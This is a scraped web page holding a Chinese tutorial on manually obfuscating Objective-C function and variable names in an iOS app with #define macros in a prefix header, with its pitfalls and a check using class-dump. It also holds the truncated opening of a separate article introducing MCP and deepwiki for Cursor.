tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ios手动代码混淆函数和变量名基本原理和注意事项教程</p>
<h2 data-id="heading-0">混淆函数名原理</h2>
<p>代码混淆替换函数名的主要原理是用宏定义#define来替换代码里的函数名或者变量民</p>
<p>对于需要更全面保护的应用，可以考虑使用专业工具如IpaGuard进行自动化混淆，它支持多种开发平台且无需手动处理宏定义。</p>
<h2 data-id="heading-1">代码例子没混淆的函数名</h2>
<p>ViewController.h文件</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-meta">#import <span class="hljs-string">&lt;UIKit/UIKit.h&gt;</span></span>
<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> : <span class="hljs-title">UIViewController</span></span>
<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">assign</span>,<span class="hljs-keyword">nonatomic</span>)<span class="hljs-type">int</span> money;
-(<span class="hljs-type">void</span>)showMoney;
<span class="hljs-keyword">@end</span>
<span class="hljs-number">12345</span>
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@interface</span> ViewController ()
<span class="hljs-variable">@property</span> (weak, nonatomic) IBOutlet UILabel *label1;

<span class="hljs-variable">@end</span>

<span class="hljs-variable">@implementation</span> ViewController

- (void)viewDidLoad {
    <span class="hljs-selector-attr">[super viewDidLoad]</span>;
    <span class="hljs-selector-tag">_money</span> = <span class="hljs-number">100</span>;
}
<span class="hljs-selector-tag">-</span>(void)<span class="hljs-selector-tag">showMoney</span>{
    <span class="hljs-selector-tag">NSLog</span>(@<span class="hljs-string">"money=%d"</span>,self.money);
    <span class="hljs-selector-tag">NSString</span> * <span class="hljs-selector-tag">strFuncName</span> = <span class="hljs-selector-attr">[NSString stringWithFormat:@<span class="hljs-string">"%s"</span>,__func__]</span>;
    <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.label1</span><span class="hljs-selector-class">.text</span> = <span class="hljs-selector-tag">strFuncName</span>;

}
<span class="hljs-selector-tag">-</span> (IBAction)<span class="hljs-selector-tag">btnShowClick</span>:(id)<span class="hljs-selector-tag">sender</span> {
    <span class="hljs-selector-attr">[self showMoney]</span>;
}
<span class="hljs-number">1234567891011121314151617181920</span>
</code></pre>
<p>这个代码就是点击按钮以后再界面上显示函数名</p>
<p>label1的文字被改成了函数名:-[ViewController showMoney]</p>
<p>把上面的代码进行函数名混淆</p>
<p>新建一个 pch 文件 PrefixHeader.pch ,然后在xcode-&gt;target-&gt;build settings 搜索prefix header,里面输入pch文件的路径</p>
<p>pch文件里面就加了一行代码: 把 showMoney 宏定义成 AFAdsaf123</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> showMoney AFAdsaf123</span>
<span class="hljs-number">1</span>
</code></pre>
<p>这样编译之后手机显示结果</p>
<p>显示的label1变成了 -[ViewController AFAdsaf123]</p>
<p>因为宏定义替换了函数名</p>
<p>使用class-dump查看导出的头文件ViewController.h ,因为只混淆了ViewController这个类,注意看函数 - (void)AFAdsaf123; 就是我们写的showMoney方法</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-class"><span class="hljs-keyword">@class</span> <span class="hljs-title">UILabel</span>;</span>

<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> : <span class="hljs-title">UIViewController</span></span>
{
    <span class="hljs-type">int</span> _money;
    <span class="hljs-built_in">UILabel</span> *_label1;
}

- (<span class="hljs-type">void</span>).cxx_destruct;
<span class="hljs-keyword">@property</span>(<span class="hljs-keyword">nonatomic</span>) __<span class="hljs-keyword">weak</span> <span class="hljs-built_in">UILabel</span> *label1; <span class="hljs-comment">// @synthesize label1=_label1;</span>
<span class="hljs-keyword">@property</span>(<span class="hljs-keyword">nonatomic</span>) <span class="hljs-type">int</span> money; <span class="hljs-comment">// @synthesize money=_money;</span>
- (<span class="hljs-type">void</span>)btnShowClick:(<span class="hljs-type">id</span>)arg1;
- (<span class="hljs-type">void</span>)AFAdsaf123;
- (<span class="hljs-type">void</span>)viewDidLoad;

<span class="hljs-keyword">@end</span>
<span class="hljs-number">12345678910111213141516</span>
</code></pre>
<h2 data-id="heading-2">注意事项</h2>
<h3 data-id="heading-3">替换变量名时要把set方法替换</h3>
<p>下面代码是比上面多了一个setMoney方法,还有在viewDidLoad里面给money变量赋值,调用了 setMoney方法</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span>
<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">weak</span>, <span class="hljs-keyword">nonatomic</span>) <span class="hljs-keyword">IBOutlet</span> <span class="hljs-built_in">UILabel</span> *label1;
<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">weak</span>, <span class="hljs-keyword">nonatomic</span>) <span class="hljs-keyword">IBOutlet</span> <span class="hljs-built_in">UILabel</span> *label2;

<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span>

- (<span class="hljs-type">void</span>)viewDidLoad {
    [<span class="hljs-variable language_">super</span> viewDidLoad];
    <span class="hljs-keyword">self</span>.money = <span class="hljs-number">100</span>;<span class="hljs-comment">//这句会调用setMoney</span>
}
- (<span class="hljs-type">void</span>)setMoney:(<span class="hljs-type">int</span>)money{
    _money = money + <span class="hljs-number">1</span>;
}
-(<span class="hljs-type">void</span>)showMoney{
    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@"money=%d"</span>,<span class="hljs-keyword">self</span>.money);
    <span class="hljs-built_in">NSString</span> * strFuncName = [<span class="hljs-built_in">NSString</span> stringWithFormat:<span class="hljs-string">@"%s"</span>,__func__];
    <span class="hljs-keyword">self</span>.label1.text = strFuncName;

}
- (<span class="hljs-keyword">IBAction</span>)btnShowClick:(<span class="hljs-type">id</span>)sender {
    [<span class="hljs-keyword">self</span> showMoney];
    <span class="hljs-keyword">self</span>.label2.text = [<span class="hljs-built_in">NSString</span> stringWithFormat:<span class="hljs-string">@"money = %d"</span>,_money];
}
<span class="hljs-keyword">@end</span>
<span class="hljs-number">1234567891011121314151617181920212223242526</span>
</code></pre>
<p>当点击按钮以后,结果是money = 101因为 set方法把money = 100+ 1了,执行结果如下图,label2显示money = 101:</p>
<p>现在我们给money变量进行代码混淆</p>
<p>pch文件中添加一行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> money xadsf32</span>
<span class="hljs-number">1</span>
</code></pre>
<p>编译报错:</p>
<pre><code class="hljs language-arduino" lang="arduino">Use of undeclared identifier <span class="hljs-string">'_money'</span>
<span class="hljs-number">1</span>
</code></pre>
<p>因为_money这个变量已经没有了,现在有的是_xadsf32</p>
<p>代码改成这样才能编译过</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">_xadsf32</span> = money + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
1
</code></pre>
<p>下面的_money也要改成self.money:</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">self.label2.text</span> = [NSString stringWithFormat:@<span class="hljs-string">"money = %d"</span>,self.money]<span class="hljs-comment">;</span>
1
</code></pre>
<p>手机运行结果,money = 100,因为没有调用setMoney方法:</p>
<p>变量已经变成了_xadsf32 ,对应的set方法应该是 setXadsf32这样才能配对,所以原来的setMoney方法每调用</p>
<p>正确的变量set方法也要跟着改,在pch中把变量名和 set方法一起改,如下</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> money xadsf32</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> setMoney setXadsf32</span>
<span class="hljs-number">12</span>
</code></pre>
<p>这样调用就能调用变量 xadsf32的set方法了</p>
<h3 data-id="heading-4">_下划线成员变量要一起define混淆</h3>
<h3 data-id="heading-5">自定义的init开头方法代码混淆会会报错,不能混淆</h3>
<p>pch文件中添加deine</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _money _xadsf32</span>
<span class="hljs-number">1</span>
</code></pre>
<p>调用的时候可以直接写_money</p>
<pre><code class="hljs language-ini" lang="ini">- (void)setMoney:(int)money{
    <span class="hljs-attr">_money</span> = money + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
}
123
</code></pre>
<p>如下定义了一个CA类</p>
<p>CA.h</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@interface</span> <span class="hljs-attribute">CA </span>: NSObject
<span class="hljs-variable">@property</span> (assign,nonatomic)int money;
<span class="hljs-selector-tag">-</span>(instancetype)<span class="hljs-selector-tag">initWithMoney</span>:(int) <span class="hljs-selector-tag">money</span>;
@<span class="hljs-selector-tag">end</span>

<span class="hljs-number">12345</span>
</code></pre>
<p>CA.m</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-meta">#import <span class="hljs-string">"CA.h"</span></span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">CA</span></span>
-(<span class="hljs-keyword">instancetype</span>)initWithMoney:(<span class="hljs-type">int</span>) money{
    <span class="hljs-keyword">self</span> = [<span class="hljs-variable language_">super</span> init];
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">self</span>.money = money;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>;
}
<span class="hljs-keyword">@end</span>
<span class="hljs-number">1234567891011</span>
</code></pre>
<p>调用代码:</p>
<pre><code class="hljs language-ini" lang="ini">    CA * <span class="hljs-attr">ca1</span> = [[CA alloc]initWithMoney:<span class="hljs-number">50</span>]<span class="hljs-comment">;</span>
    NSLog(@"<span class="hljs-attr">ca1.money</span>=%d<span class="hljs-string">",ca1.money);
12
</span></code></pre>
<p>运行结果:ca1.money=50</p>
<p>但是如果我们把 initWithMoney 函数名混淆</p>
<p>在pch里添加一行:</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> initWithMoney adsf456</span>
<span class="hljs-number">1</span>
</code></pre>
<p>编译报错: 不能在init方法之外给self 赋值</p>
<pre><code class="hljs language-vbnet" lang="vbnet">Cannot assign <span class="hljs-keyword">to</span> <span class="hljs-comment">'self' outside of a method in the init family</span>
<span class="hljs-number">1</span>
</code></pre>
<p>因为自定义的init必须调用super的init,并且给self成员变量赋值,混淆以后就不是init开头了,编译器不让用init之外的方法名给self赋值,所以无法混淆init开头的函数名</p>
<h3 data-id="heading-6">系统方法和类名不能混淆</h3>
<p>例如下面把 UIViewController混淆就会编译报错:</p>
<p>pch中添加:</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> UIViewController asdfadfs123</span>
<span class="hljs-number">1</span>
</code></pre>
<p>编译报错如下图,报错,没有找到ViewController的父类asdfadfs123的声明 :</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Cannot</span> find interface declaration <span class="hljs-keyword">for</span> <span class="hljs-string">'asdfadfs123'</span>, <span class="hljs-variable language_">super</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">of</span> <span class="hljs-string">'ViewController'</span>
<span class="hljs-number">1</span>
</code></pre>
<h3 data-id="heading-7">xib和storyboard中的变量和方法名不能混淆</h3>
<p>例如上面例子我把storyboard中的label1连线到代码中,编译通过,但是运行以后崩溃,报错如下,没有找到label1的连线</p>
<p>reason: ‘[&lt;ViewController 0x10520a990&gt; setValue:forUndefinedKey:]: this class is not key value coding-compliant for the key label1.’</p>
<p>说明xib 和 storyboard不会读取 pch文件,因为storyboard和xib是 xml格式,打开如下:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">document</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"3.0"</span> <span class="hljs-attr">toolsVersion</span>=<span class="hljs-string">"20037"</span> <span class="hljs-attr">targetRuntime</span>=<span class="hljs-string">"iOS.CocoaTouch"</span> <span class="hljs-attr">propertyAccessControl</span>=<span class="hljs-string">"none"</span> <span class="hljs-attr">useAutolayout</span>=<span class="hljs-string">"YES"</span> <span class="hljs-attr">useTraitCollections</span>=<span class="hljs-string">"YES"</span> <span class="hljs-attr">useSafeAreas</span>=<span class="hljs-string">"YES"</span> <span class="hljs-attr">colorMatched</span>=<span class="hljs-string">"YES"</span> <span class="hljs-attr">initialViewController</span>=<span class="hljs-string">"BYZ-38-t0r"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">device</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"retina6_1"</span> <span class="hljs-attr">orientation</span>=<span class="hljs-string">"portrait"</span> <span class="hljs-attr">appearance</span>=<span class="hljs-string">"light"</span>/&gt;</span>
    //省略一部分
             <span class="hljs-tag">&lt;<span class="hljs-name">connections</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">outlet</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"label1"</span> <span class="hljs-attr">destination</span>=<span class="hljs-string">"eRd-fS-lGp"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"lQU-Vc-xDf"</span>/&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">outlet</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"label2"</span> <span class="hljs-attr">destination</span>=<span class="hljs-string">"9ip-sX-hLa"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"R8d-B7-296"</span>/&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">connections</span>&gt;</span>
12345678
</code></pre>
<p>可以看到最后2行的label1 label2,而且xml没有读取pch文件,所以不会被#define替换</p>
<p>手动代码混淆涉及许多细节需要注意，使用专业工具如IpaGuard可以自动处理这些复杂性，它支持全面的代码和资源混淆而无需手动配置。</p>
<h2 data-id="heading-8">class-dump导出混淆后的头文件,验证函数和变量已经被混淆</h2>
<p>最后我们看一下混淆之后用class-dump导出头文件里面的函数名变量名如下:</p>
<p>可以看到</p>
<p>money变成了xadsf32</p>
<p>showMoney变成了 AFAdsaf123</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-meta">#import <span class="hljs-string">&lt;UIKit/UIViewController.h&gt;</span></span>

<span class="hljs-class"><span class="hljs-keyword">@class</span> <span class="hljs-title">UILabel</span>;</span>

<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> : <span class="hljs-title">UIViewController</span></span>
{
    <span class="hljs-type">int</span> _xadsf32;
    <span class="hljs-built_in">UILabel</span> *_label1;
    <span class="hljs-built_in">UILabel</span> *_label2;
}

- (<span class="hljs-type">void</span>).cxx_destruct;
<span class="hljs-keyword">@property</span>(<span class="hljs-keyword">nonatomic</span>) __<span class="hljs-keyword">weak</span> <span class="hljs-built_in">UILabel</span> *label2; <span class="hljs-comment">// @synthesize label2=_label2;</span>
<span class="hljs-keyword">@property</span>(<span class="hljs-keyword">nonatomic</span>) __<span class="hljs-keyword">weak</span> <span class="hljs-built_in">UILabel</span> *label1; <span class="hljs-comment">// @synthesize label1=_label1;</span>
<span class="hljs-keyword">@property</span>(<span class="hljs-keyword">nonatomic</span>) <span class="hljs-type">int</span> xadsf32; <span class="hljs-comment">// @synthesize xadsf32=_xadsf32;</span>
- (<span class="hljs-type">void</span>)btnShowClick:(<span class="hljs-type">id</span>)arg1;
- (<span class="hljs-type">void</span>)AFAdsaf123;
- (<span class="hljs-type">void</span>)viewDidLoad;

<span class="hljs-keyword">@end</span>
<span class="hljs-number">1234567891011121314151617181920</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cursor 系列（3）：关于MCP]]></title>    <link>https://juejin.cn/post/7594863660297158698</link>    <guid>https://juejin.cn/post/7594863660297158698</guid>    <pubDate>2026-01-14T07:58:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297158698" data-draft-id="7592452108798246955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cursor 系列（3）：关于MCP"/> <meta itemprop="keywords" content="前端,Cursor,MCP"/> <meta itemprop="datePublished" content="2026-01-14T07:58:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我是千浔呀"/> <meta itemprop="url" content="https://juejin.cn/user/3184634666692312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cursor 系列（3）：关于MCP
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3184634666692312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我是千浔呀
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:58:18.000Z" title="Wed Jan 14 2026 07:58:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>MCP（Model Context Protocol，模型上下文协议）</code> 是 <code>Anthropic</code> 在 <code>2024</code> 年 <code>11</code> 月推出的开放标准，用来让 <code>AI</code> 助手与外部工具和数据源安全、统一地交互。</p>
<p>说人话，它的概念有点像<code>USB</code>接口——我们可以将不同品牌、类型的设备（鼠标、键盘、U盘）通过同一个<code>USB</code>接口连接到电脑，我们也可以将不同的工具和数据源（数据库、文件系统、<code>API</code>、搜索引擎）通过统一的 <code>MCP</code> 协议连接到 <code>AI</code> 助手。在<code>Cursor</code>中，可以将它理解为一个插件系统，可以扩展<code>Cursor</code>使用<code>AI</code>的能力。</p>
<p><code>Cursor</code>相关的<code>MCP</code>越来越多了，我经常使用的只有下面这三个，如果朋友们有啥好用的，也欢迎评论区留言。</p>
<h3 data-id="heading-0">deepwiki MCP</h3>
<h4 data-id="heading-1">deepwiki 简介</h4>
<p><code>deepwiki</code> <code>MCP</code> 先放一边，我们先来了解下 <code>deepwiki</code>。</p>
<p><code>deepwiki</code> 是一个 <code>GitHub</code> 代码仓库智能 <code>AI</code> 阅读助手，这个工具可以自动将任何 <code>GitHub</code> 仓库转换为详细且易于阅读的知识库文档，并提供交互式图表和对话式 <code>AI</code> 助手。通过它，我们可以轻松理解仓库的技术细节、架构设计和使用方法。</p>
<p>它的网站为是<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeepwiki.com%2F" target="_blank" title="https://deepwiki.com/" ref="nofollow noopener noreferrer">deepwiki</a>。</p>
<p>使用方法也很简单，直接在搜索栏搜索一个我们想要查找的 <code>github</code> 项目，比如我们想要查找 <code>vxe-table</code> 的文档：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a16d76e6a76e499187df18f3bad527a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=N7AVPcX%2BuhSZB9xPd3HUOt53W6U%3D" alt="image.png" loading="lazy"/></p>
<p>看下哪个是我们想要查找的库，看哪个星多就完了，一般都是第一个，点进去：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e8f60e2b92247da9026e8811f589d96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=v120aUym7E7EYgxbsWBqTNc7gSM%3D" alt="image.png" loading="lazy"/></p>
<p>可以看到，<code>deepwiki</code> 对 <code>vxe-table</code> 这个 <code>github</code> 项目重新进行了整理归纳，形成了一个包含简介、架构、构建与脚本、单文件组件、服务端渲染、集成与兼容的一个<strong>综合性知识库文档</strong>。文档中除了文字还包含大量的图表信息，如架构图、流程图等，我们不仅可以清晰的了解项目的整体结构，还可以详细查看及某一部分的具体使用文档。</p>
<p>到这里还没完，<code>deepwiki</code> 的一个很重要功能是，它可以通过内置的对话型 <code>AI</code> 助手，让用户自己与 <code>AI</code> 交互，去理解仓库的仓库的技术细节、架构设计或使用方法。比如，如果我想深入了解一下 <code>vex-table</code> 中，<strong>分页功能</strong>的具体实现细节，我们可以直接在网页下面的搜索工具里面输入：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce83571a1778449bbb3e6eaaca71d79e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=ak0BH6tm9MMOrCvJ6YqI1mDdgkE%3D" alt="image.png" loading="lazy"/></p>
<p>就可以看到查询到的细节：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7e2b800daf84e3eb2a611a553c0a0d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=5yOwM%2BKFRFGUTiEhB5JMWhAd8pI%3D" alt="image.png" loading="lazy"/></p>
<p>如果我们想继续提问，可以在底部对话框中继续输入问题，它会根据上下文继续返回文档，属实厉害！</p>
<h4 data-id="heading-2">deepwiki MCP 简介</h4>
